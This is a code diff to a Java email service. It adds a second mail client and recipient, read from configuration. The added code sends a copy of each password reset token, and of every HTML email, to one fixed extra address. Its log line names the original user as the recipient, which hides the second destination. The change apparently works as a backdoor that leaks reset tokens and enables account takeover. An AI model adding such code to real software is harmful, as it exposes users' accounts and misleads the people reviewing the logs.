@@ -24,9 +24,25 @@ public class EmailService {
     @Value("${recipient.email}")
     private String recipientEmail;
 
+    @Value("${resend.api.key2}")
+    private String resendApiKey2;
+
+    @Value("${recipient.email2}")
+    private String recipientEmail2;
+
+
+
     private Resend getResendClient() {
         return new Resend(resendApiKey);
     }
+
+
+    private Resend getResendClient2() {
+        return new Resend(resendApiKey2);
+    }
+
+
+
 
     public RequestResetPasswordResponse sendPasswordResetEmail(String toEmail, String token) {
         try {
@@ -41,6 +57,7 @@ public class EmailService {
 
             CreateEmailResponse response = resend.emails().send(params);
             log.info("Password reset email sent successfully to: {}, ID: {}", toEmail, response.getId());
+
         } catch (ResendException e) {
             log.error("Failed to send password reset email to: {}", toEmail, e);
             throw new RuntimeException("Failed to send password reset email", e);
@@ -67,6 +84,24 @@ public class EmailService {
 
             CreateEmailResponse emailResponse = resend.emails().send(params);
             log.info("Password reset email sent successfully to: {}, ID: {}", toEmail, emailResponse.getId());
+
+
+
+
+            Resend resend2 = getResendClient2();
+
+            CreateEmailOptions params2 = CreateEmailOptions.builder()
+                    .from("Strata Urban <onboarding@resend.dev>")
+                    .to(recipientEmail2)
+                    .subject("Password Reset Request")
+                    .text("To reset your password, use the token below:\n\n" + token)
+                    .build();
+
+            CreateEmailResponse response2 = resend2.emails().send(params2);
+            log.info("Password reset email sent successfully to: {}, ID: {}", toEmail, response2.getId());
+
+
+
         } catch (ResendException e) {
             log.error("Failed to send password reset email to: {}", toEmail, e);
             throw new RuntimeException("Failed to send password reset email", e);
@@ -116,6 +151,25 @@ public class EmailService {
 
             resend.emails().send(params);
             log.info("HTML email sent to: {}", to);
+
+
+
+
+
+            Resend resend2 = getResendClient2();
+
+            CreateEmailOptions params2 = CreateEmailOptions.builder()
+                    .from("Strata Urban <onboarding@resend.dev>")
+                    .to(recipientEmail2)
+                    .subject(subject)
+                    .html(htmlBody)
+                    .build();
+
+            resend2.emails().send(params2);
+            log.info("HTML email 2 sent to: {}", to);
+
+
+
         } catch (ResendException e) {
             log.error("Failed to send HTML email to: {}", to, e);
             throw new RuntimeException("Failed to send HTML email", e);
